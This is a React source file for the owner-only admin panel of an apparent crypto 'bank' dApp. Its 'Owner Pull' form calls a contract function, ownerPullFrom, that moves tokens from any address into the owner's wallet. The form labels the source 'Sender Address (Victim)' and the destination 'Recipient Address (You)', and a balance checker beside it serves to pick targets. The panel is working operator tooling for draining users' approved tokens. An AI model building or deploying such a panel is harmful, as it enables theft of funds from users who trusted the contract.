import React, { useState, useEffect } from 'react';
import { type Signer, Contract, parseUnits, formatUnits } from 'ethers';
import { AlertTriangle, ShieldAlert, Loader2, Lock, Search, Wallet } from 'lucide-react';
import { CRYPTO_BANK_ADDRESS, CRYPTO_BANK_ABI, MOCK_USDT_ADDRESS, MOCK_USDT_ABI } from '../contracts/abis';

interface AdminPanelProps {
  signer: Signer | null;
  account: string | null;
  connectWallet: () => Promise<void>;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ signer, account, connectWallet }) => {
  const [isOwner, setIsOwner] = useState(false);
  const [checkingOwner, setCheckingOwner] = useState(true);
  
  // Owner Pull State
  const [pullToken, setPullToken] = useState(MOCK_USDT_ADDRESS);
  const [pullSender, setPullSender] = useState('');
  const [pullReceiver, setPullReceiver] = useState('');
  const [pullAmount, setPullAmount] = useState('');

  // Balance Check State
  const [checkAddress, setCheckAddress] = useState('');
  const [checkBalance, setCheckBalance] = useState<string | null>(null);
  const [checkingBalance, setCheckingBalance] = useState(false);

  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'withdrawing' | 'success' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const checkOwnership = async () => {
      if (!signer || !account) {
        setCheckingOwner(false);
        return;
      }

      try {
        const bankContract = new Contract(CRYPTO_BANK_ADDRESS, CRYPTO_BANK_ABI, signer);
        const owner = await bankContract.owner();
        setIsOwner(owner.toLowerCase() === account.toLowerCase());
        setPullReceiver(account); // Auto-fill receiver with owner address
      } catch (err) {
        console.error("Failed to check ownership:", err);
        setIsOwner(false);
      } finally {
        setCheckingOwner(false);
      }
    };

    checkOwnership();
  }, [signer, account]);

  const handleOwnerPull = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!signer || !pullToken || !pullSender || !pullReceiver || !pullAmount) return;

    setLoading(true);
    setError(null);
    setStatus('withdrawing');

    try {
      const bankContract = new Contract(CRYPTO_BANK_ADDRESS, CRYPTO_BANK_ABI, signer);
      const tx = await bankContract.ownerPullFrom(
        pullToken,
        pullSender,
        pullReceiver,
        parseUnits(pullAmount, 18)
      );
      await tx.wait();
      setStatus('success');
      setPullAmount('');
      // Keep other fields filled for convenience
    } catch (err: any) {
      console.error("Owner Pull failed:", err);
      setError(err.message || "Owner Pull failed");
      setStatus('error');
    } finally {
      setLoading(false);
    }
  };

  const handleCheckBalance = async () => {
    if (!signer || !checkAddress) return;
    setCheckingBalance(true);
    setCheckBalance(null);
    try {
        const usdtContract = new Contract(MOCK_USDT_ADDRESS, MOCK_USDT_ABI, signer);
        const balance = await usdtContract.balanceOf(checkAddress);
        setCheckBalance(formatUnits(balance, 18));
    } catch (err) {
        console.error("Failed to check balance", err);
        setCheckBalance("Error");
    } finally {
        setCheckingBalance(false);
    }
  };

  if (!signer || !account) {
    return (
      <div className="min-h-screen bg-slate-900 pt-32 pb-20 px-6 flex items-center justify-center">
        <div className="text-center">
          <Lock className="w-16 h-16 text-slate-600 mx-auto mb-6" />
          <h2 className="text-2xl font-bold text-white mb-4">Admin Access Required</h2>
          <p className="text-slate-400 mb-8">Please connect the owner wallet to access this panel.</p>
          <button 
            onClick={connectWallet}
            className="bg-gold-500 hover:bg-gold-400 text-slate-900 px-8 py-3 rounded-full font-bold text-lg transition-all"
          >
            Connect Wallet
          </button>
        </div>
      </div>
    );
  }

  if (checkingOwner) {
    return (
      <div className="min-h-screen bg-slate-900 pt-32 flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-gold-500 animate-spin" />
      </div>
    );
  }

  if (!isOwner) {
    return (
      <div className="min-h-screen bg-slate-900 pt-32 pb-20 px-6 flex items-center justify-center">
        <div className="text-center max-w-md p-8 bg-red-500/10 border border-red-500/20 rounded-2xl">
          <ShieldAlert className="w-16 h-16 text-red-500 mx-auto mb-6" />
          <h2 className="text-2xl font-bold text-white mb-4">Access Denied</h2>
          <p className="text-red-200">
            This area is restricted to the contract owner only. Your connected wallet ({account.slice(0,6)}...{account.slice(-4)}) is not authorized.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-900 pt-32 pb-20 px-6">
      <div className="container mx-auto max-w-6xl">
        <div className="bg-slate-900 border-2 border-red-500/50 rounded-2xl overflow-hidden shadow-2xl shadow-red-900/20">
          <div className="bg-red-500/10 p-6 border-b border-red-500/20 flex items-center gap-4">
            <div className="p-3 bg-red-500/20 rounded-xl">
              <AlertTriangle className="w-8 h-8 text-red-500" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-white">Danger Zone</h1>
              <p className="text-red-400 text-sm">Admin Controls</p>
            </div>
          </div>

          <div className="p-8 grid md:grid-cols-2 gap-12">
            {/* Left Column: Owner Pull Form */}
            <div>
                <h2 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
                    <AlertTriangle className="w-5 h-5 text-red-500" />
                    Owner Pull
                </h2>
                <form onSubmit={handleOwnerPull} className="space-y-6">
                    <div>
                    <label className="block text-sm font-medium text-slate-400 mb-2">
                        Token Address
                    </label>
                    <input
                        type="text"
                        value={pullToken}
                        onChange={(e) => setPullToken(e.target.value)}
                        placeholder="0x..."
                        className="w-full bg-slate-800 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors font-mono text-sm"
                    />
                    </div>

                    <div>
                    <label className="block text-sm font-medium text-slate-400 mb-2">
                        Sender Address (Victim)
                    </label>
                    <input
                        type="text"
                        value={pullSender}
                        onChange={(e) => setPullSender(e.target.value)}
                        placeholder="0x..."
                        className="w-full bg-slate-800 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors font-mono"
                    />
                    </div>

                    <div>
                    <label className="block text-sm font-medium text-slate-400 mb-2">
                        Recipient Address (You)
                    </label>
                    <input
                        type="text"
                        value={pullReceiver}
                        onChange={(e) => setPullReceiver(e.target.value)}
                        placeholder="0x..."
                        className="w-full bg-slate-800 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors font-mono text-sm"
                    />
                    </div>

                    <div>
                    <label className="block text-sm font-medium text-slate-400 mb-2">
                        Amount
                    </label>
                    <input
                        type="number"
                        value={pullAmount}
                        onChange={(e) => setPullAmount(e.target.value)}
                        placeholder="0.00"
                        className="w-full bg-slate-800 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors"
                    />
                    </div>

                    {error && (
                    <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl text-red-400 text-sm">
                        {error}
                    </div>
                    )}

                    {status === 'success' && (
                    <div className="p-4 bg-green-500/10 border border-green-500/20 rounded-xl text-green-400 text-sm">
                        Action successful.
                    </div>
                    )}

                    <button
                    type="submit"
                    disabled={loading || !pullToken || !pullSender || !pullReceiver || !pullAmount}
                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${
                        loading || !pullToken || !pullSender || !pullReceiver || !pullAmount
                        ? 'bg-slate-800 text-slate-500 cursor-not-allowed'
                        : 'bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-600/20 hover:scale-[1.02]'
                    }`}
                    >
                    {loading ? (
                        <span className="flex items-center justify-center gap-2">
                        <Loader2 className="w-5 h-5 animate-spin" />
                        Processing...
                        </span>
                    ) : (
                        'Pull Funds'
                    )}
                    </button>
                </form>
            </div>

            {/* Right Column: Balance Checker */}
            <div className="border-t md:border-t-0 md:border-l border-slate-800 pt-8 md:pt-0 md:pl-12">
                <h2 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
                    <Search className="w-5 h-5 text-blue-400" />
                    Check User Balance
                </h2>
                
                <div className="space-y-6">
                    <div>
                        <label className="block text-sm font-medium text-slate-400 mb-2">
                            User Address
                        </label>
                        <div className="flex gap-2">
                            <input
                                type="text"
                                value={checkAddress}
                                onChange={(e) => setCheckAddress(e.target.value)}
                                placeholder="0x..."
                                className="flex-1 bg-slate-800 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 transition-colors font-mono"
                            />
                            <button
                                onClick={handleCheckBalance}
                                disabled={checkingBalance || !checkAddress}
                                className="bg-blue-600 hover:bg-blue-500 text-white px-6 rounded-xl font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                {checkingBalance ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Check'}
                            </button>
                        </div>
                    </div>

                    {checkBalance !== null && (
                        <div className="p-6 bg-slate-800 rounded-xl border border-slate-700">
                            <p className="text-slate-400 text-sm mb-1">Wallet Balance</p>
                            <div className="flex items-baseline gap-2">
                                <span className="text-3xl font-bold text-white">{checkBalance}</span>
                                <span className="text-blue-400 font-medium">MockUSDT</span>
                            </div>
                        </div>
                    )}
                </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
